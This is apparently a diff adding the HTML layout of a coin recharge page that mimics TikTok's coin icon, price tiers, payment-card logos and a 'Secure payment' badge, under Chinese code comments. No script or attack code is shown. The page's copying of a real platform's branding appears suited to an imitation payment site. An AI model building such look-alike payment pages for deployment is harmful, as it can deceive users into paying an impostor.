+            <div class="username-input-wrapper">
+                <div class="username-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="currentColor"/>
+                    </svg>
+                </div>
+                <input type="text" class="username-input" id="username-input" placeholder="Enter Username" inputmode="none">
+                <button class="paste-btn" id="paste-btn" type="button" title="粘贴">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M9 5H7C5.89543 5 5 5.89543 5 7V19C5 20.1046 5.89543 21 7 21H17C18.1046 21 19 20.1046 19 19V7C19 5.89543 18.1046 5 17 5H15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M9 5C9 3.89543 9.89543 3 11 3H13C14.1046 3 15 3.89543 15 5V7H9V5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M9 12H15M9 16H15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- 金币选项 -->
+            <div class="coin-grid">
+                <div class="coin-option selected">
+                    <div class="coin-amount">
+                        <svg class="coin-icon" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <span>30</span>
+                    </div>
+                    <div class="coin-price">$0.31</div>
+                </div>
+                <div class="coin-option">
+                    <div class="coin-amount">
+                        <svg class="coin-icon" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <span>350</span>
+                    </div>
+                    <div class="coin-price">$3.65</div>
+                </div>
+                <div class="coin-option">
+                    <div class="coin-amount">
+                        <svg class="coin-icon" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <span>700</span>
+                    </div>
+                    <div class="coin-price">$7.25</div>
+                </div>
+                <div class="coin-option">
+                    <div class="coin-amount">
+                        <svg class="coin-icon" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <span>1,400</span>
+                    </div>
+                    <div class="coin-price">$14.49</div>
+                </div>
+                <div class="coin-option">
+                    <div class="coin-amount">
+                        <svg class="coin-icon" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <span>3,500</span>
+                    </div>
+                    <div class="coin-price">$36.2</div>
+                </div>
+                <div class="coin-option">
+                    <div class="coin-amount">
+                        <svg class="coin-icon" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <span>7,000</span>
+                    </div>
+                    <div class="coin-price">$72.39</div>
+                </div>
+                <div class="coin-option">
+                    <div class="coin-amount">
+                        <svg class="coin-icon" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <span>17,500</span>
+                    </div>
+                    <div class="coin-price">$180.99</div>
+                </div>
+                <div class="coin-option custom-option">
+                    <div class="coin-amount">
+                        <svg class="coin-icon" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <span class="custom-label">Custom</span>
+                        <input type="number" class="custom-input" placeholder="" min="30" max="2500000" style="display: none;">
+                    </div>
+                    <div class="custom-note">30-2,500,000</div>
+                </div>
+            </div>
+
+            <!-- 底部支付面板容器 -->
+            <div class="bottom-payment-panel">
+                <!-- Special Offer -->
+                <div class="special-offer">
+                    <div class="special-offer-title">
+                        <span>Special offer</span>
+                        <svg fill="currentColor" color="inherit" font-size="14px" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M24 6a18 18 0 1 0 0 36 18 18 0 0 0 0-36ZM2 24a22 22 0 1 1 44 0 22 22 0 0 1-44 0Zm25-8a3 3 0 1 1-6 0 3 3 0 0 1 6 0Zm-4 6a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h2a1 1 0 0 0 1-1V23a1 1 0 0 0-1-1h-2Z"></path></svg>
+                    </div>
+                    <div class="special-offer-value">
+                        <span class="desktop-text">5% cash back on your next order</span>
+                        <span class="mobile-text">Unlock 5% cash back</span>
+                        <svg fill="currentColor" class="chevron-sSxs5s" style="color: #fe2c55; margin-left: 4px;" font-size="inherit" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="m24 28.75 13.67-13.67a1 1 0 0 1 1.41 0l1.84 1.84a1 1 0 0 1 0 1.41L24.71 34.54a1 1 0 0 1-1.42 0L7.1 18.34a1 1 0 0 1 0-1.42l1.83-1.84a1 1 0 0 1 1.41 0L24 28.75Z"></path></svg>
+                    </div>
+                </div>
+
+                <!-- 支付方式 -->
+                <div class="payment-section">
+                    <div class="payment-label">Payment method</div>
+                    <div class="payment-methods">
+                        <img src="./img/visa_acffbd.png" alt="VISA">
+                        <img src="./img/mastercard_light_5865fd.png" alt="Mastercard">
+                        <img src="./img/card_american_express_51cd3f.png" alt="American Express">
+                        <img src="./img/diners_0faca9.png" alt="Diners Club">
+                        <img src="./img/card_jcb_0481eb.png" alt="JCB">
+                        <img src="./img/paypal-light_839c52.png" alt="PayPal">
+                    </div>
+                </div>
+
+                <!-- 总计 -->
+                <div class="total-section">
+                    <span>Total</span>
+                    <span class="total-amount">$0.31</span>
+                </div>
+
+                <!-- 充值按钮 -->
+                <button class="recharge-btn">
+                    <span class="btn-text desktop-btn-text">Recharge</span>
+                    <svg class="btn-icon mobile-btn-icon" fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M28.22 13.7a4.83 4.83 0 0 0 4.86 4.8l-.04 3.45c-1.77 0-3.4-.53-4.75-1.43l-.09 6.99a6.64 6.64 0 0 1-6.69 6.3 6.44 6.44 0 0 1-6.53-6.45 6.63 6.63 0 0 1 7.61-6.4l-.04 3.7a2.97 2.97 0 0 0-3.88 2.7 2.85 2.85 0 0 0 2.89 2.85 2.93 2.93 0 0 0 2.96-2.85l.16-13.66h3.54Z"></path><path d="M5 23.15V10.5c0-1.2 1.06-2.17 2.26-2.28 3.05-.25 8.87-1.52 15.34-6.99.8-.67 2-.67 2.8 0 6.46 5.46 12.28 6.74 15.34 7 1.2.1 2.26 1.07 2.26 2.27v12.65c0 14.13-14.77 21.8-18.27 23.43-.47.22-1 .22-1.47 0C19.76 44.96 5 37.28 5 23.15Zm4-11.1v11.1c0 5.57 2.88 10.04 6.56 13.5 3.1 2.91 6.5 4.86 8.44 5.85a37.07 37.07 0 0 0 8.43-5.85C36.11 33.2 39 28.72 39 23.15V12.04c-3.65-.53-9.1-2.16-15-6.8-5.91 4.64-11.35 6.27-15 6.8Z"></path></svg>
+                    <span class="btn-text mobile-btn-text" data-price="$0.31"></span>
+                </button>
+            </div>
+
+            <!-- 安全标签 -->
+            <svg xmlns="http://www.w3.org/2000/svg" width="65" height="27" fill="none" viewBox="0 0 65 27" alt="secure payment icon" style="position: absolute; bottom: 24px; right: 24px; height: 27px; width: 65px; cursor: pointer;"><rect width="63" height="26" x="1.287" y="0.5" fill="#60A901" fill-opacity="0.1" rx="13"></rect><path fill="#8BC73F" fill-rule="evenodd" d="M13.736 8.421a.484.484 0 0 1 .674 0c.177.173.472.349.854.515a9.5 9.5 0 0 0 1.202.414 16 16 0 0 0 1.467.332l.022.004h.005c.23.038.399.232.399.46v.168l-.002.473c-.002.408-.006.99-.015 1.687 0 2.007-.9 3.456-1.856 4.395a6.6 6.6 0 0 1-1.383 1.043 4 4 0 0 1-.558.264 1.4 1.4 0 0 1-.472.11 1.4 1.4 0 0 1-.472-.11 4 4 0 0 1-.558-.264 6.6 6.6 0 0 1-1.383-1.043c-.957-.939-1.855-2.387-1.856-4.394a175 175 0 0 1-.016-2.129v-.2c0-.228.168-.422.397-.46h.006l.022-.004a10 10 0 0 0 .414-.079c.275-.056.65-.141 1.053-.253a9.5 9.5 0 0 0 1.203-.414c.382-.166.676-.342.853-.515m2.287 3.49a.24.24 0 0 1-.01.336l-2.089 1.98a.476.476 0 0 1-.646.007l-1.013-.912a.24.24 0 0 1-.018-.336l.319-.354a.24.24 0 0 1 .336-.018l.687.618 1.77-1.676a.24.24 0 0 1 .336.009z" clip-rule="evenodd"></path><path fill="#161823" d="M24.505 12.096q-1.425 0-2.272-.848l.624-.888q.697.728 1.696.728.448 0 .688-.168.24-.176.24-.424 0-.216-.232-.352a1.6 1.6 0 0 0-.568-.208 9 9 0 0 1-.736-.176 6 6 0 0 1-.744-.272 1.4 1.4 0 0 1-.568-.48 1.4 1.4 0 0 1-.224-.8q0-.689.552-1.152.552-.472 1.472-.472 1.272 0 2.08.744l-.632.848q-.632-.584-1.552-.584-.352 0-.552.144a.45.45 0 0 0-.2.384q0 .192.224.32.232.128.568.2.345.064.736.184.4.12.736.28.345.152.568.488.232.329.232.792 0 .768-.552 1.24-.544.472-1.584.472M31.174 12h-3.776V6.664h3.776v1h-2.64v1.12h2.584v1h-2.584V11h2.64zm3.48.096q-1.224 0-2.04-.768-.808-.776-.808-1.992 0-1.224.808-1.992.816-.768 2.04-.768 1.496 0 2.224 1.304l-.976.48a1.43 1.43 0 0 0-.52-.552 1.3 1.3 0 0 0-.728-.224q-.728 0-1.208.496-.472.496-.472 1.256t.472 1.256q.48.496 1.208.496.392 0 .728-.216.345-.225.52-.56l.976.472q-.744 1.312-2.224 1.312m7.1-.6q-.607.6-1.792.6t-1.8-.6q-.608-.608-.608-1.632v-3.2h1.152v3.168q0 .575.328.92.328.336.928.336t.92-.336q.328-.344.328-.92V6.664h1.16v3.2q0 1.024-.616 1.632m6.003.504h-1.312l-1.048-1.896h-.832V12H43.43V6.664h2.496q.825 0 1.312.48t.488 1.24q0 .656-.352 1.064a1.5 1.5 0 0 1-.824.52zm-1.992-2.896q.345 0 .568-.192a.68.68 0 0 0 .224-.536.64.64 0 0 0-.224-.512.82.82 0 0 0-.568-.2h-1.2v1.44zM52.345 12H48.57V6.664h3.776v1h-2.64v1.12h2.584v1h-2.584V11h2.64z"></path><path fill="#161823" fill-opacity="0.6" d="M23.361 20h-.664v-5.336h2.144q.776 0 1.224.464t.448 1.144-.456 1.144q-.448.465-1.216.464h-1.48zm1.4-2.712q.472 0 .768-.28a.98.98 0 0 0 .296-.736.96.96 0 0 0-.296-.728q-.295-.288-.768-.288h-1.4v2.032zM30.228 20h-.6v-.44q-.472.536-1.28.536a1.4 1.4 0 0 1-.936-.344q-.408-.344-.408-.936 0-.615.4-.944t.944-.328q.815 0 1.28.52v-.696q0-.375-.272-.592t-.704-.216q-.696 0-1.184.536l-.28-.416q.615-.64 1.544-.64.665 0 1.08.32t.416.984zm-1.656-.336q.712 0 1.056-.48v-.736q-.353-.472-1.056-.472-.424 0-.696.24a.76.76 0 0 0-.264.6q0 .375.264.616.271.232.696.232m2.659 1.848.088-.544a.8.8 0 0 0 .328.064q.207 0 .344-.088t.232-.32l.256-.584-1.616-3.904h.656l1.28 3.168 1.288-3.168h.648l-1.936 4.648q-.32.768-1.136.784-.249 0-.432-.056M40.624 20h-.6v-2.624q0-.8-.712-.8-.287 0-.575.176a1.3 1.3 0 0 0-.449.416V20h-.6v-2.624q0-.8-.712-.8-.28 0-.568.176a1.5 1.5 0 0 0-.447.424V20h-.6v-3.864h.6v.56q.15-.232.504-.44.36-.216.752-.216.416 0 .68.2a.95.95 0 0 1 .352.52q.175-.288.535-.504t.76-.216q1.08 0 1.08 1.168zm2.95.096q-.873 0-1.425-.56-.552-.569-.552-1.472 0-.848.544-1.432a1.77 1.77 0 0 1 1.36-.592q.857 0 1.352.592.504.585.504 1.48v.152h-3.12q.04.568.408.952.376.384.976.384.72 0 1.2-.496l.288.392q-.615.6-1.536.6m1.191-2.28a1.37 1.37 0 0 0-.336-.88q-.327-.4-.936-.4-.576 0-.912.392a1.46 1.46 0 0 0-.352.888zM49.537 20h-.592v-2.528q0-.488-.224-.688-.224-.208-.648-.208-.336 0-.648.176a1.6 1.6 0 0 0-.496.424V20h-.6v-3.864h.6v.56q.225-.272.6-.464.376-.192.784-.192 1.224 0 1.224 1.248zm2.19.096q-.864 0-.864-.904v-2.528h-.64v-.528h.64V15.08h.608v1.056h.784v.528h-.784v2.4q0 .225.096.36.105.136.288.136.257 0 .408-.168l.176.456q-.264.248-.712.248"></path><rect width="63" height="26" x="1.287" y="0.5" stroke="#60A901" rx="13"></rect></svg>
+    </div>
+
+    <!-- 侧边栏操作 -->
+    <div class="sidebar-actions">
+            <div class="sidebar-icon" title="Customer Service"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIcAAACHCAYAAAA850oKAAAACXBIWXMAACE4AAAhOAFFljFgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAABNWSURBVHgB7V1PcxTHFX8zkjB/AisllargQFiRil0VJxYol9xYdElOQfYhlVMQfAADvuUSSb7khuRjLpLIB7CEK2chfwEhfIgdHLSLoSxcZSNkhAAJ7eT9ZqeX3tHM7vzvntX8qMdoZ2Zne7p//d7r1/8M6n6UWc6w9DvHknOu7Fzvd8SNJy6psdxnWWe5w7LinO9aGNRdQCGPUoMEQ/SaFGkB5ABJQJYl5+8aFdACKPgKyzRLlcXSQG6zzDrpKpAxBCHmqaHidSCEn6w76bxIBVJFhRoaQndCtCPKLBUaJTFAS1xhuUX5IkInWaVCm0QGSDFO+dUSYUlSpgIdsV9I4Zaq894FfADzsd9I4adJCjioUPf5FEmQ5AztY8CETFG+Ci1rmaV96I9USJ+gle6yb0xNoS2iy3VKtytAKcpUaIu4skpdaGYuUtESSUoes1ylLsE45Svz8yB1ynlcBPZxlvKV6XmTGcqhH4IEo+s6TxmdV1mmHPkhZSocz6wlF45qmQpiFATxQJkKYhQE8UCZCmLoRBBtnNTC+dRPlkkTgsxSvjJuv8gMxUQPxcM4dVG0rssguvw/IwXA4Jy81KL9KoikXqSIiDqpqUwNP6Nrewm7COjTGqYIk62ikEM4oGXSFP39/VQul+nMmTP28dSpU81zOAL42wtPnjzZI/fv36dqtWofa7UaraysUM5QpQZBQk3fjEIOjMfQxs9AYVcqFVuGhoZsQggCpAkQBLK0tER37tzJA2FQbh9SihgjDWwpE8EaHx+3bt26ZekC1izW7OysNTo6ajE5lecRefsfFUoJZVIY6EKGgxAohDwARAGJVeWXj6QWIJsjoqxfxs7gubk5K69YXV21Ll68qAs5INcpIIL6HGgz36YMAb9henqaOGNJR8AxlY+A2+mVAYd2cnKSbty4QYoBgoxQY8mIRFClDNmNmra+vm7pApgyJqo1NjZmscPb0afAdWi8K1euWPPz8y2mcGZmRgefZJESwhhRdgmHX6EDQM6JiYnE/AbZPMLUsIZRRQwInNNEWpxVyibBWhADtRyaK63aDVJAAy0uLqomCAYqt3VOO/kc4ywTlAE4w4g9fFIFBLvgE8DP6QT4FULcz4Ag5oFjkGcgTqIQkxSxfMuUodZQ2USFX9BOU+Ca8B+C+kJ4H9wPLaRYQ8TSHn4Yo4wSCXusAijoq1evtk1XUoE2TeMekAmKgGpGibNtcNZAzUbLw48UaWkyDXwNt4TWHmNZJjBrcqDgvQoI57IKyUOTaEKS0C2XapYJzJIcfsRQEVtBk9ZPe2UsgeMelawTlxU5/Iihsgldr9fb+j0ZSeBOubmsE5cVObxqKdS7aoAgIGjW+e6SKT